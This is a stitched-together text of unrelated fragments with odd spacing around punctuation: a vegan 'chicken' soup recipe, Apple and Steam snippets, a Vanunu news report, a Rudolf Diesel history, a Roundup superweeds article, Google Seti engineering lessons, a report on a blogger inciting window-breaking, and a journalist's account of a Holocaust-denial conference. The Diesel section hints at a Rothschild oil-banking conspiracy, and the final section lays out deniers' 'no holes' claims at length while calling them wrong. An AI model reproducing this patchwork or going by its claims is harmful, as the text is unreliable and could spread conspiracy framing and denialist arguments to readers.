BRYANNA'S VERSION OF CALDO DE " GALLINA " VEGAN ( VEGAN " PERUVIAN PENECILLIN " OR " CHICKEN " SOUP )
Servings : 6
Broth :
10 cups good vegetarian chicken - style broth ( a rich - tasting broth -- I like to use Vegan No-Chicken Better than Bouillon Broth Past e )
1 large onion , chopped small
4 small inner celery stalks with leaves , left whole
2 medium carrots , scrubbed and cut in small dice
1 whole head of garlic , sliced in half horizontally
1/ 1 " piece of fresh ginger ( do n't peel ) sliced in half and smashed with the side of a knife
Later additions :
6 medium ( 3 oz. each ) Yukon
Gold or other yellow potatoes , cut in half
1/2 teaspoon dried red chile flakes ( optional -- do n't use if you serve the soup with fresh chiles )
2 teaspoons dried cilantro ( optional -- do n't use if you serve the soup with fresh cilantro )
3 cups reconstituted Soy Curls® ( 3 oz. dry ) ( OR you can use vegan " chicken strips " or " tenders " , or strips of " chickeny " seitan instead -- see alternates here . )
6 oz tagliatelle pasta ( preferably the kind in little " nests " ) or fettuccine ( takes the place of egg noodles )
salt , if needed , and freshly - ground black pepper to taste
Garnishes and Condiments :
4 green onions , chopped
2 limes ( or lemons ) , quartered
2 - 4 tablespoons fresh chopped cilantro or parsley , preferably Italian ( if you use this , use the dried cilantro above )
1 fresh red chile , seeded and minced ( if you use this , do n't use the dried chile flakes above )
OPTIONAL : Scrambled Tofu
12 oz firm tofu , crumbled ( not too finely )
4 teaspoons olive oil
3 tablespoons nutritional yeast flakes
1/2 teaspoon onion powder
1/4 teaspoon garlic granules
4 teaspoons soy sauce
In a large pot , place the broth , chopped onion , whole celery stalks , diced carrots , halved garlic head , and ginger .
Bring to a boil , then turn down to a simmer and cook , uncovered , for 30 minutes .
During this time , you can assemble the Garnishes and Condiments , and make the optional Scrambled Tofu , if you are using it ( see procedure at end of this recipe ) .
This takes the place of the hard - boiled eggs often served with this soup at breakfast , but it 's optional .
This is a variation of Julie Hasson 's recipe .
Fish the celery stalks , the garlic , and the ginger out of the broth with a slotted spoon .
Discard the celery and ginger .
Squeeze the garlic cloves out of the skins and mash them on a plate with a fork .
Set aside .
Add the potatoes to the broth , and the dried cilantro and chile flakes , if you are using them .
Simmer , covered , until the potatoes are just tender .
Add the reconstituted Soy Curls® ( or alternate ) and the pasta .
Cook at a lively simmer , covered , until the pasta is tender .
Stir in the reserved mashed garlic .
To serve , arrange the garnishes on the table .
Serve the soup in wide bowls , placing 2 halves of a potato in each bowl , about 1/2 cup of the Soy Curls® , and a clump of pasta side - by - side in each bowl .
Ladle on some of the broth with the carrots .
Let each diner add garnishes and condiments as they like .
To Make the Optional Scrambled Tofu :
Heat a nonstick or cast iron pan with 2 teaspoons of the olive oil , When hot , add the crumbled tofu .
Stir around in the hot oil until it starts to get golden .
Mix the nutritional yeast with the onion powder and garlic granules .
Sprinkle it over the tofu and mix around .
Add the last 2 teaspoons of olive oil and toss well .
Add the soy sauce and stir to distribute evenly .

But who cares .
If you ’re a Mac user , you have already clicked the link and started installing it like me .
Update : I ’m getting an “ Unauthorized ” pop - up box .
Is anyone else getting this ?
I guess Steam still needs to lift that “ Closed Beta ” flag .

Reports have been swirling that Apple plans to ban screen protectors from its brick and mortar retail stores , but for the time being , the items seem to be plentiful throughout many store locations .
Several Apple Stores we contacted Thursday afternoon assured
Ars that there were currently " plenty " of screen protectors in stock , and did not indicate that this would change anytime soon .
( One sales associate went as far as listing off all the variations that were in stock . )
None of the outlets mentioned anything about the impending ban or removing the product from inventory in the future .
Rumors of Apple ’s supposed ban started Wednesday when iLounge reported that several companies had been informed that , starting in May , Apple would no longer carry screen protectors in their retail stores .
According to iLounge 's sources , stand - alone solutions as well as those bundled with cases will eventually be removed .
There were so many pundit theories about what could have sparked the decision that iLounge wrote a follow - up article to address them .
The conspiracy theorists came up with all kinds of reasons :
Apple is making room for iPad accessories , Apple wants you to ruin your phone so you have to buy another , the iPhone is too classy for a flimsy piece of plastic , etc .
Our personal favorite theory was that Apple might be planning a new product or technology that does n’t work properly with the film applied .
iLounge even got an e-mail from an Apple Store employee , suggesting that the ban might be due to the difficulty in applying the protective layer .
Apparently , this employee 's store barred employees from doing this for customers some time ago .
In our experiences here at Ars , the iPhone screen is extremely hard to scratch , though some of us have admittedly had much better luck than others .
It seems much more likely that an iPhone screen will crack due to a fall than it will develop noticeable scratch .
In that case , no amount of thin , flimsy , plastic is going to save your device from that .
What Apple is up to is really anyone 's guess .
We would like to think that Apple is coming out with its own line of overpriced iPhone screen protectors , but it 's more likely they are just more trouble than they 're worth for Apple .
Screen protectors may still be available at Apple Stores , but probably not for long .
Do n't worry — you can get the exact same thing for your iPhone from places like Best Buy , Fry's , and almost any other outlet that sells iPhone accessories .
Mordechai Vanunu , the Israeli whistleblower who exposed Israel 's nuclear arsenal to the world and paid for it with 18 years in jail , mostly in solitary confinement , was sent back to prison today for a new three - month sentence .
Vanunu , 56 , was jailed for unauthorised meetings with foreigners , including his Norwegian girlfriend .
Amnesty International said he had been living under a " draconian " military order and was now considered a " prisoner of conscience " .
Moroccan - born Vanunu , a former technician at Israel 's secret nuclear plant near Dimona , appeared at the Jerusalem district court today , where he was led away to jail .
" I survived 18 years – I could survive another six , " he shouted .
" Are you trying to discipline me ?
You can not take my freedom of expression away ...
You wo n't get from me in three months what you did n't get in 18 years . "
In April 2007 he was convicted of meeting foreigners , including journalists and his girlfriend , and was sentenced to six months .
That was reduced to three months on appeal and he was given the option of community service in West Jerusalem .
Vanunu said he feared being attacked and would only do the service in Arab East Jerusalem , where he lives .
The court refused and today he was jailed .
" Shame on you Israel , " Vanunu said : " The stupid Shin Bet and Mossad spies are putting me back in prison after 24 years of speaking nothing but the truth .
Shame on you democracy , the Knesset , synagogues and the world media .
Shame on you all the Arabs that are allowing me to be put back in prison .
Shame on you Senate , congress , and the chairman of the International Atomic Energy Agency for not protecting my freedom .
Shame on you all the world 's religions , the stupid spies , the Jews , Christians and Muslims . "
" Everyone knows that Israel has nuclear weapons but no one is talking about it , " he said .
The world does n't want nuclear weapons – not in Israel , not in the Middle East and not anywhere in the world . "
Vanunu , a convert from Judaism to Christianity , was kidnapped in a honeytrap set by the Mossad agents in Rome in September 1986 .
Days earlier he had spoken to Sunday Times journalists , giving them information on Israel 's secret nuclear programme .
His details and pictures were enough to convince foreign experts that Israel already had a significant nuclear arsenal .
He was secretly taken to Israel by ship , tried and jailed for 18 years .
He spent the first 11 years in solitary confinement .
In April 2004 he was released , but was subjected to restrictions under a military order renewed every six months .
He was not allowed to leave the country or to have unauthorised meetings with foreigners or to visit foreign embassies .
Amnesty International said the restrictions were not parole , because Vanunu had already served his full term .
" They arbitrarily limit his rights to freedom of movement , expression and association and are therefore in breach of international law , " Amnesty said .
At one time , Diesel power was poised as an alternative to big Coal and Oil …
Today it could once again bridge the sustainability gap , offering Industry and Transportation the time to find its renewable power for the Future .

At the World ’s Fair of 1900 in Paris France , Rudolph Diesel demonstrated the virtues of his new pressure - ignited “ rational heat motor ” which came to bear his name to the world then , and has done so to the present day .
We ’ve come to also know Rudolf Diesel as an eminent mechanical and thermal engineer , a multi-lingual and knowledgeable patron of the Arts , and not least of all a highly progressive Social Theorist .
Although his legacy is inestimable , his rise to fame was as quick as it was brief … and leaves us with some unanswered questions about how Diesel ’s vision may have offered us a different world than the one ruled by Oil and Big Banks .
Early years …
Prior to revolutionizing the world of mechanized power , the Paris - born , Bavarian - bred Diesel had pursued his education in England , and at the Polytechnic School in Munich .
He worked as a mechanic and parts designer for two years at the Sulzer Machine Works of Winterthur in Switzerland , and in 1880 , he returned to Paris ( after having been expelled during the Franco Prussion War in 1870 ) and began his engineering career in earnest .
He joined the Linde Refrigeration Enterprises and worked as a refrigerator engineer , where he focused his talents on motorised power …
Where the future began to take shape .
In 1885 , Rudolf established his first laboratory - shop in Paris and began his 13 - year quest to create and develop his high efficiency internal - combustion engine , and moved to the Berlin branch to continue his search in 1890 .
A year later , he took out his first patents — for machines to make clear ice , and worked out the theoretical basis for a constant temperature ( isothermic ) engine throughout the remainder of the decade , while he also worked on an ammonia vapor engine and ( less rigorously ) on a solar - powered engine as well .
By 1892 , he received a patent for his high - compression engine that could auto - ignite fuel without a sparking system , and on August 10 , 1893 at the Augsburg Machine Works , Diesel ’s prime model , which was composed of only a 10 - foot iron cylinder with a flywheel at its base , operated on its own power for the first time .
Making Revolutions
In 1900 it ’s put forward that the British Navy was highly impressed by this engine that could run on peanut or vegetable oil , and promised a theoretical efficiency of 70 % , as compared to the thermal efficiency of only 10 % for the steam driven engines that powered the navy at the time .
Since the rising volumes of refined of petroleum was producing large amounts of a suitable oil byproduct , “ diesel fuel ” was always synonymous with fossil fuels .
In fact it was n’t until much recent concerns about oil reserves and rising prices , that Rudolph Diesels original intent came to fruition , and provided Society the means to burn vegetable oils , or other forms of “ Bio - Diesel in his powerful and seemingly timeless invention .
“ The diesel engine can be fed with vegetable oils and would help considerably in the development of agriculture of the countries which use it ” and that “ The use of vegetable oils for engine fuels may seem insignificant today .
But such oils may become in course of time as important as petroleum and the coal tar products of the present time . ” – Rudolf Diesel 1912
One of Diesel ’s key motivations to invent his high - efficiency engine ( readily adaptable in size and utilizing locally available fuels ) was to help relieve the burdens of the independent Artisan class of laborers and Craftsmen , who struggled to survive against the competition of large - scale industries that had virtually monopolized the predominant , over sized , expensive , and fuel - wasting power of the steam engine .
Later ( in 1903 ) he published a book called Solidarismus : Natuürliche wirtschaftliche Erloösung des Menschen ( Solidarism : The Natural Economic Salvation of Man ) , in which he called for , among other things , worker - run factories .
So , we can clearly see Diesels pre-occupation with social values and freedoms .
Prepare for War
Meanwhile ,
By 1913 the world was again gearing up for conflict , and the British Navy was running into serious safety issues with its petrol - powered submarine engines that required hot exhaust conduits , and created fuel fumes that were just a spark away from triggering a nautical disaster .
While at the same time Rudolph Diesel was allegedly profoundly disturbed by the German Navy ’s adoption of diesel engines for it ’s own submarines .
Concurrently , coal fired steamers were being converted to oil to try alleviate the concerns of spontaneous onboard coal - fires which often broke out deep in the coal bunkers under the enormous weight of the fuel ( as is suspected to have played a part in the Titanic Disaster the year before in 1912 )
Oil fired steam engines also provided slightly quicker response time due to the much more flexible fueling methods offered by oil , over laborious challenges of coal transfer .
It ’s also speculated however that the British Navy was obtaining funds to modernise it ’s fleet through the Rothschild Empire with the proviso that they converted engines to use Middle East oil sources , which were owned through the same interests that were offering loans to the Admiralty .
It seems that the British were being held over oil barrels owned by Bankers , much as they may have been during their forced purchase of the Suez Canal in 1875 to prevent an empire divided by a French owned shipping bottleneck .
In September of 1913 … Rudolf Diesel boarded the Dresden in Antwerp Belgium , for a trip to London where he was to discuss the lucrative contractual terms for further refinements to his designs that would optimize them for marine application .
After buying a bag of oranges , and requesting to be awoken at 6:15 AM , he retired for the evening , and was never seen alive again .
His floating corpse was recovered 10 days later , with no signs of the contract that he was seen to be carrying on his person .
Rudolf Christian Karl Diesel ( 1858 - 1913 )
Few men have left as far reaching a legacy as Rudolf Diesel .
His engines — heavier and more expensive to build per horsepower than gasoline engines , but much more durable and cheaper to operate — made rapid inroads in shipping in the 1920s , heavy - duty trucking and construction equipment in the 1930s , railroads in the 1950s , and began to gain ground in passenger automobiles following the energy crises of the 1970s .
They are literally the engines that have driven industry and commerce through the 20th Century .
Today we ’re seeing a renewed interest in the Bio - Fuels that were first employed by Diesel as a means to enable local energy to be grown by Farmers .
Although hemp production was effectively killed
The diesel technology that he spawned continues to be refined , and we are seeing impressive new strides being made in Diesel Locomotives , that could once again help revolutionize Transit and Transportation in a world that needs to replace gasoline engines as the dominant form of mechanical energy .
Glimpse into the Future !
Diesel technology is evolving and adapting itself again … This time to offer an even cleaner , renewable power source for the Future .

Yep , thanks to Monsanto Roundup , American agriculture is in quite a fix now .
See , Monsanto sells genetically modified seed that 's supposed to survive spraying with their weedkiller .
Unfortunately , the weeds learned to resist it - and now their GMO seed is struggling against the pesticide - resistant weeds that evolved as a result of their own product .
Would n't it be nice if companies thought that far ahead before they pushed their products into the mainstream ?
And would n't it be nice if we had government agencies that did n't rubber stamp them ?
DYERSBURG , Tenn . —
For 15 years , Eddie Anderson , a farmer , has been a strict adherent of no -till agriculture , an environmentally friendly technique that all but eliminates plowing to curb erosion and the harmful runoff of fertilizers and pesticides .
On a recent afternoon here , Mr. Anderson watched as tractors crisscrossed a rolling field — plowing and mixing herbicides into the soil to kill weeds where soybeans will soon be planted .
Just as the heavy use of antibiotics contributed to the rise of drug - resistant supergerms , American farmers ’ near - ubiquitous use of the weedkiller Roundup has led to the rapid growth of tenacious new superweeds .
To fight them , Mr. Anderson and farmers throughout the East , Midwest and South are being forced to spray fields with more toxic herbicides , pull weeds by hand and return to more labor - intensive methods like regular plowing .
“ We ’re back to where we were 20 years ago , ” said Mr. Anderson , who will plow about one - third of his 3,000 acres of soybean fields this spring , more than he has in years .
“ We ’re trying to find out what works . ”
Farm experts say that such efforts could lead to higher food prices , lower crop yields , rising farm costs and more pollution of land and water .
[...]
Pigweed can grow three inches a day and reach seven feet or more , choking out crops ; it is so sturdy that it can damage harvesting equipment .
In an attempt to kill the pest before it becomes that big , Mr. Anderson and his neighbors are plowing their fields and mixing herbicides into the soil .
That threatens to reverse one of the agricultural advances bolstered by the Roundup revolution : minimum - till farming .
By combining Roundup and Roundup Ready crops , farmers did not have to plow under the weeds to control them .
That reduced erosion , the runoff of chemicals into waterways and the use of fuel for tractors .
If frequent plowing becomes necessary again , “ that is certainly a major concern for our environment , ” Ken Smith , a weed scientist at the University of Arkansas , said .
In addition , some critics of genetically engineered crops say that the use of extra herbicides , including some old ones that are less environmentally tolerable than Roundup , belies the claims made by the biotechnology industry that its crops would be better for the environment .

Those teams are not necessarily die - hard machine learning experts , and so they do not want to waste much time figuring out how to get a system up and running .

System reliability :
Teams are much more willing to deploy a reliable machine learning system in a live environment .
They want a system that is dependable and unlikely to crash or need constant attention .
Early versions of Seti had marginally better accuracy on large data sets , but were complex , stressed the network and GFS architecture considerably , and needed constant babysitting .
The number of teams willing to deploy these versions was low .
Seti is typically used in places where a machine learning system will provide a significant improvement in accuracy over the existing system .
The gains are usually large enough that most teams do not care about the small differences in accuracy between different flavors of algorithms .
And , in practice , the small differences are often washed out by other effects such as better data filtering , adding another useful feature , parameter tuning , etc .
Teams much prefer having a stable , scalable and easy - to - use classification system .
We found that these other aspects can be the difference between a deployable system and one that gets abandoned .
It is perhaps less academically interesting to design an algorithm that is slightly worse in accuracy , but that has greater ease of use and system reliability .
However , in our experience , it is very valuable in practice .
Having good accuracy across a variety of domains is very important , and we were tempted to focus exclusively on this aspect of the algorithm .
However , in a practical system there are several other aspects of an algorithm that are equally critical :

Lesson
We could examine what the small number of domains had in common .
By building something that would work for a few domains , it was likely the resulting system would be useful for others .
More importantly , it helped us quickly decide what aspects were unnecessary .
We noticed that it was surprisingly easy to over - generalize or over - engineer a machine learning system .
The domains grounded our project in reality and drove our decision making .
Without them , even deciding how broad to make the input file format would have been harder ( e.g. , is it important to permit binary / categorical / real - valued features ?
Multiple classes ?
Fractional labels ?
Weighted instances ? ) .
Working with a few different teams as initial guinea pigs allowed us to learn about common teething problems , and helped us smooth the process of deployment for future teams .
It was tempting to build a learning system without focusing on any particular application .
After all , our goal was to create a large scale system that would be useful on a wide variety of present and future classification tasks .
Nevertheless , we decided to focus primarily on a small handful of initial applications .
We believe this decision was useful in several ways :
Lesson
We have a hammer , but we do n't want to end up with bent screws .
Being machine learning practitioners , it was very tempting for us to always recommend using machine learning for a problem .
We saw very early on that , despite its many significant benefits , machine learning typically adds complexity , opacity and unpredictability to a system .
In reality , simpler techniques are sometimes good enough for the task at hand .
And in the long run , the extra effort that would have been spent integrating , maintaining and diagnosing issues with a live machine learning system could be spent on other way of improving the system instead .
Seti is often used in places where there is a good chance of significantly improving predictive accuracy over the incumbent system .
And we usually advise teams against trying the system when we believe there is likely to be only a small improvement .
A right - wing Southern blogger 's responding to the passage of the federal healthcare bill the way a pissed - off 12 - year - old might respond when a neighbor hands out crappy Halloween candy .
Mike Vander­boegh of Pinson , Alabama runs a blog called Sipsey Street Irregulars , dedicated to a " strict constructionist , libertarian point of view , " and has begun what he 's calling " window wars , " where he asks citizens to break the office windows of members of Congress who supported the healthcare legislation .
So far , at least three windows have become casualties of this incredibly juvenile war , including the window at the Tucson office of Congresswoman Gabrielle Giffords .
Early Monday morning -- just hours after the healthcare bill was signed -- someone either shot or kicked out the front window of Giffords ' office .
Gifford 's window was n't the only target in the offensive -- a member of Congress in New York also found her window broken , as did the Monroe County ( New York ) Democratic headquarters .
The latter rock had a note attached to the brick with a quote from former Arizona Senator Barry Goldwater : " Ex­tremism in defense of liberty is novice . "
The window at the Democratic headquarters was reportedly broken on Saturday night or Sunday morning , just a day after Vander­boegh posted a blog alerting fellow hillbillies that " if you wish to send a message that Pelosi and her party cannot fail to hear , break their windows . "
We guess that in cracker - speak , nothing gets your message across like the old rock - through - the - window trick .
Vanderboegh credits the idea of busting windows to the Sons of Liberty .
" When the Sons of Liberty wanted to express their opposition to the actions of the King 's ministers , they would gather in front of the homes and offices of his tax - collectors and government officials in Boston or New York and break their windows .
Glass was expensive .
The King 's minions were often the most well - to - do .
The Sons of Liberty hit them in their pocketbooks , " Vanderboegh writes in his call to arms .
We sent Vanderboegh an e-mail to try to see this war from his side of the glass , but he did not immediately respond .
Monroe County Democratic Committee Chairman Joe Morelle is considering asking district attorneys in both New York and Alabama to consider charges against Vanderboegh , but the blogger does n't seem to care .
Since hearing of the vandalism , Vanderboegh 's site has become a shrine to the stupidity he 's helped create -- with pictures and stories about the broken windows and an homage to his 15 minutes of fame .
He even tells the Rochester Democrat and Chronicle that he welcomes a day in court .
" That would certainly give me an opportunity to make my case to a larger public , " Vander­boegh says .
" I would n't enjoy a sedition charge , but I 'm willing to accept it .
Perhaps that 's a more efficient use of my re­sources than getting arrested for vandalism . "
We 'd rather hand this guy some spray - paint and a carton of eggs and tell him to go nuts than have him turn a vandalism charge into a political showcase against healthcare , but that 's just us .
Who would think that you can do these very outstanding and amazing chalk arts !
Using the streets , roads , avenues , and even pavements as their canvass , they made living art that is worth seeing .
Come and let your eyes fill with the mighty awesomeness of these street chalk arts !
A round of applause to the great artist Julian Beever .
Amazing Huh ?
these are optical illusions that are really stunning !
how I wish to see a real on for myself !

The people who say the Holocaust did n't happen asked me to speak at their recent international conference .
The invitation surprised me , for I am a Jew who 's written about the Holocaust and ( for chrissakes , I feel like adding ) certainly has n't denied it .
To my eyes , however , the invitation , which came from the Institute for Historical Review in Orange County , California , the central asylum for the delusion that the Germans did n't kill any Jews and that the Holocaust is , quote unquote , the Hoax of the Twentieth Century , was not just a wonderment ; it was also a golden opportunity , a golden - engraved temptation .
We journalists usually sit at the outer edge of occasions : behind the bar in courtrooms , far off the floor of Congress , well out of passing or pitching range at football or baseball games .
We are the beggars at banquet halls , waiting for the brass bell and the two - second bite , and the institute offered me what every journalist hungers for : the feast of unhampered access .
Its letter was a safe - conduct pass to a country so fogbound that you and I can't discern it .
Who are the Holocaust deniers ?
What are they like behind closed doors ?
And why are they motionless stones as avalanches of evidence crash onto them , roaring , You 're wrong , you 're wrong ?
I 'd been invited to mingle with them like a mole in Hitler 's Eagle 's Nest and then ascend to a lectern to tell them off , and I wrote the institute saying that , yes , I 'd come .
I flew on a Friday to John Wayne Airport in Orange County and called up the institute , asking , " Where will the conference be ? "
Until then I had n't known , for the institute feared that I might divulge it to the Jewish Defense League , a group the FBI has called active terrorists , and that the league might initiate violence .
It had done so at other conferences to other speakers .
One had been punched , punched by a fist also holding a cherry pie , one had been beaten up , and one had been beaten up in Paris , Vichy , Lyon , and Stockholm .
A man who 's older than me -- I 'm seventy -- this last man had been maced , thrown to the ground , and kicked in the head because of his imprudent belief that the Holocaust did n't take place .
For six weeks his jaw had been wired and he 'd eaten through a soda straw .
All three men , the leading lights of denial , would speak at this weekend 's conference , and the institute did n't want to see their freedom of speech or their bodies imperiled by Jews who conducted chants of " Nazis ! " " Neo - Nazis ! " or " Anti-Semites ! " or by Jews who threw punches .
On the phone , an institute employee told me where the conference was but said , " Do n't tell anyone . "
Knowing where to go , I took a courtesy van to a palm - filled hotel with a Japanese footbridge over a rambling pool , the sun glinting off its rippling water .
A few deniers ( who'd also called up the institute and been told , " Do n't tell " ) were down in the open - air lobby , making hollow jokes about the threat , possibly imminent , possibly not , of the Jewish Defense League .
" I 'm checking everything out , " a man from Adelaide , Australia , laughed to me .
" Should I have concerns about my security here ? " a tall and broad - shouldered man from New York , an Italian , asked me .
" Are you concerned about it ? "
" Now that I 'm out of the closet , yes .
The people around me say I should be .
Do you think my life 's in jeopardy here ? "
" We 'll soon find out , " I said .
" The Jewish Defense League is right here in California and , I 'm sure , know we 're around . "
" Heh , " said the man from New York .
By six o'clock the lobby was full .
The deniers ( by Saturday there 'd be 140 ) were about three quarters men and one quarter women .
Most were white , but one was African - American .
One was bald , but none were razor - shaved skinheads .
Many wore beards , one a white bushy one like Santa Claus's .
Most wore slacks and short - sleeved shirts , but a few wore jackets , blazers , or business suits , one a safari suit , and one a white suit like Mark Twain's .
Two wore T - shirts that said , NO HOLES ?
NO HOLOCAUST !
a text whose exegesis I 'd get on Saturday .
The conversations I heard were about nutrition ( " I was raised on raw milk " ) and about paddle wheelers ( " You know , like in Show Boat .
You have n't seen it ?
I suggest you rent it " ) .
All in all , the deniers that day and that weekend seemed the most middling of Middle Americans .
Or better : Despite their take on the Holocaust , they were affable , open - minded , intelligent , intellectual .
Their eyes were n't fires of unapproachable certitude , and their lips were n't lemon twists of astringent hate .
Nazis and neo -Nazis they did n't seem to be .
Nor did they seem anti-Semites .
I 'm sure many anti-Semites say the Holocaust did n't happen ( even as they take delight that it really did ) , but I do n't believe I met any that weekend .
The only debatably anti-Semitic comment that I heard was on Friday night , when I dined in the downstairs restaurant with a prominent denier in a NO HOLES ?
NO HOLOCAUST !
shirt , an Alabama man whose name is Dr. Robert Countess .
A gangling scholar of classical Greek and classical Hebrew , he had taught history at the University of Alabama and had retired to a farm outside of Huntsville , where he plays major league Ping - Pong and collects old Peugeots ; he has twenty - two , some dating back to the Crash .
While scarcely cranky , he had a cranky - sounding voice , and in the open - air restaurant he was practically grinding gears as he discoursed on the Septuagint and as I , not Countess , brought up the Jewish sacred scrolls , the Talmud .
" What 's called the Talmud , " Countess lectured -- " talmud being the participle form of lamad , in Hebrew , learn -- developed in Babylonia as rabbis reflected on certain passages in the Torah .
Some of these rabbis engaged in a syncretism , a bringing together , of Babylonian paganism with the religion of Abraham , Isaac , and Jacob .
So if you read much of the Talmud , and Elda will tell you her favorite story ... "
" No , " said Elda , Countess 's wife , who was dining with us .
" It 's unbelievable , but it's in the Talmud , " said Countess .
" No , no .
I do n't want to tell it , " said Elda , embarrassed .
" Go ahead and tell it , " Countess entreated .
" Well , " said Elda , blushing , " it 's in the Talmud that if a Jewish man 's repairing the roof , and if his sister - in - law is down below , and if he falls onto her and she becomes pregnant ... "
" He falls off the roof in such a way ... "
Countess said , laughing .
" Can you picture it ?
Then the child wo n't be a bastard , " said Elda .
The tale would be anti-Semitic rubbish if it were n't indeed in the Talmud ( in Yevamot , and again in Bava Kamma ) and if the Countesses were just amused and not also appalled .
" You and I laugh about this , " said Countess , " but I sit in stark amazement saying , Jews are n't stupid people !
How can they go along with this ? "
" The answer is , We do n't , " I explained .
By bedtime on Friday , my impression of the Countesses was like my impression of UFO devotees .
Everyone in America believes in one or another ridiculous thing .
Me , I belong to the International Society for Cryptozoology , and I firmly believe that in Lake Tele , in the heart of the Congo , there is a living , breathing dinosaur .
Admittedly , this is trivial compared with Holocaust denial , but fifteen years ago I even went to the Congo to photograph it .
I did n't --
I did n't even see it -- but I still believe in it .
Other people believe more momentous things , and the Countesses and the other deniers believe that the Holocaust did n't happen .
Like me in the Congo , they 're wrong , wrong , wrong , but to say that emphatically is n't to say ( as some people do ) that they 're odious , contemptible , despicable .
To say that they 're rats ( as does Deborah Lipstadt , the author of Denying the Holocaust ) is no more correct than to say it of people who , in their ignorance , believe the less pernicious fallacy that Oswald did n't kill Kennedy .
The conference started on Saturday .
In the center of the lobby stood a Kentia palm and in concentric circles around it were peace lilies , crotons , bird - of - paradise flowers , and happy conferencegoers .
Young and old , they talked like any Americans at any professional conference ; they talked of the weather , their homes , their children ( " One is a lawyer , another a businessman .
For their sake I 'm still in the closet " ) .
On the hour , more and more were wearing the NO HOLES ?
NO HOLOCAUST !
shirts in red , green , and gray as they seated themselves on bridge chairs to listen to speakers in the shuttered darkness of the garden ballroom .
" It 's one heck of a nice conference , " I heard someone say .
Now about " No holes ?
No Holocaust ! " -- the first thing to know is that no one at that palm - filled hotel would deny that Hitler hated the Jews , that Hitler sent them to concentration camps , and that Hitler said , " I want to annihilate the Jews " as hundreds of thousands died in ( as one denier called them ) godforsaken hellholes like Auschwitz .
It may surprise you , but no one at that hotel would deny that hundreds of thousands of Jews died of typhus , dysentery , starvation , and exhaustion at Auschwitz or that their corpses went to the constant flames of five crematoriums night and day .
These deniers even call this the Holocaust .
What they deny is that some of the Jews died of something other than natural causes , that some went to rooms that the Germans poured cyanide ( or at four other camps , carbon monoxide ) into .
The Jews , say the Holocaust deniers , were n't murdered , and the Germans did n't deliberately murder them .
Tens of thousands of witnesses disagree .
Jews who once stood at the railroad depot at Auschwitz say that the Germans told them , " Go right , " and told their mothers , fathers , and children , " Go left , " and say that they never saw those mothers , fathers , and children again .
I and the rest of the world believe that the Jews who went left went to cyanide chambers , but the deniers believe they went to other parts of Auschwitz or , by train , to other concentration camps .
" Part of the Jews remained in Auschwitz , " a speaker ( another scholar , a man who speaks seventeen languages , including Chinese ) said at the ballroom lectern one day .
" The rest were transported farther .
Many opted to stay in the Soviet Union . "
Tens of thousands of witnesses saw the cyanide chambers , too , saw the lilac - colored cyanide pellets cascade onto the Jews , but almost all of these witnesses died in five minutes , without being able to testify to it .
A few indeed testified , among them two Auschwitz commandants .
One said that children under twelve and people over fifty - five were cyanided daily , and one said , " At least 2,500,000 victims were executed by gassing , " then backed off to 1,200,000 .
Some doctors at Auschwitz testified .
One doctor said , " When the doors were opened , bodies fell out , " and one doctor said , " The Inferno , by Dante , is in comparison almost comedy . "
Some Jews who toted bodies to the crematoriums testified .
One said , " We found heaps of naked bodies , doubled up .
They were pinkish and in places red .
Some were covered with greenish marks , and saliva ran from their mouths .
Others were bleeding from the nose .
There was excrement on many of them , " and one said , " We were met by the sight of the dead bodies lying higgledy - piggledy .
I was petrified . "
To this abundant evidence the Holocaust deniers say -- and they 're right -- that one Auschwitz commandant confessed after he was tortured and that the other reports are full of bias , rumors , exaggerations , and other preposterous matters , to quote the editor of a Jewish magazine five years after the war .
The deniers say , and again they 're right , that the commandants , doctors , SS , and Jews at Bergen - Belsen , Buchenwald , and a whole alphabet of camps testified after the war that there were cyanide chambers at those camps that all historians today refute .
The deniers also say that at Auschwitz the witnesses said that the Germans poured cyanide pellets through holes in the chamber roofs -- even said that the Germans joked as they poured , " Na , gib Ihnen schon zu fressen " --
Well , give them something good to eat .
It 's there that the NO HOLES ?
NO HOLOCAUST ! on the T - shirts comes in .
The roofs at Auschwitz still stand ( or , rather , lie collapsed , for the Germans blew up the buildings in November 1944 so the world would n't know ) , and , the deniers say , you can't find holes in those former roofs for the Germans to pour the cyanide through .
Myself , I 'd call this one of life 's mysteries , like why there are holes in Swiss cheese and not in cheddar , but everyone in the palm - filled hotel made a tremendous deal of it .
One speaker there was David Irving , the British World War II historian , a man with a statesman 's bearing , a statesman 's elegant pinstripe suit , and a member of Parliament 's elocution , a man who strung together his clear definitions , crisp distinctions , and withering innuendos in parse - perfect sentences , like graduated pearls .
He had just sued , for libel , the author and publisher of Denying the Holocaust .
The trial was in London last year .
Irving lost , but not before he invoked the " No holes ?
No Holocaust ! " argument .
On the stand , a witness for the author and publisher cited some Auschwitz witnesses , and Irving , acting as his own attorney , leaped like a crouching lion .
" Professor , " said Irving , a granite - featured , imposing man , " we are wasting our time , really , are we not ?
There were never any holes in that roof .
There are no holes in that roof today .
They [ the Germans ] cannot have poured cyanide capsules through that roof .
You yourself have stood on that roof and looked for those holes and not found them .
Our experts have stood on that roof and not found them .
The holes were never there .
What do you say to that ? "
" The roof is a mess .
The roof is absolutely a mess , " said the professor .
" The roof is in fragments . "
" You have been to Auschwitz how many times ? "
" Sometimes twice or three times yearly . "
" Have you frequently visited this roof ? "
" Yes , I have been there , yes . "
" Have you never felt the urge to go and start scraping where you know those holes would have been ? "
" The last thing I 'd ever have done is start scraping away . "
" How much does an air ticket to Warsaw cost ?
£ 100 ? £ 200 ? "
" I have no idea . "
" If , " said Irving triumphantly , " you were to go to Auschwitz with a trowel and clean away the gravel and find a reinforced concrete hole , I would abandon my action immediately .
That would drive such a hole through my case that I would have no possible chance of defending it . "
Not quite flying to Auschwitz , the author , the publisher , or the professor apparently called up the Auschwitz Museum , for the museum told the Times of London that it had started searching for the fabulous holes .
A two - mile drive .
A trowel .
A camera .
That 's what the search entailed , but it 's now nine months later and the museum has n't found them .
But lo !
Someone did .
Not someone from the Auschwitz Museum , but Charles " Chuck " Provan , a letterhead printer in Monongahela , Pennsylvania , and another scheduled speaker here in California .
A man of childlike enthusiasms , a roly - poly , red - bearded , merry man , a man with a brandy - glass - shaped face , he 'd been an earnest denier until he had an epiphany in December 1990 .
Provan was home in Monongahela , reading from The Confessions of Kurt Gerstein , an SS man who confessed he was at the concentration camp in Belzec , Poland , and who said , " I see everything !
The mothers , their babies at the breast , the little naked children , the men and women , naked .
They enter into the death chamber , pushed by the leather whips of the SS .
Pack well , that is what [ the ] captain ordered .
Seven to eight hundred persons on twenty - five square meters .
More than half are children . ... "
For forty - five years , the Confessions had been the laughingstock of the Holocaust deniers .
What ?
Seven to eight hundred people on twenty - five square meters ?
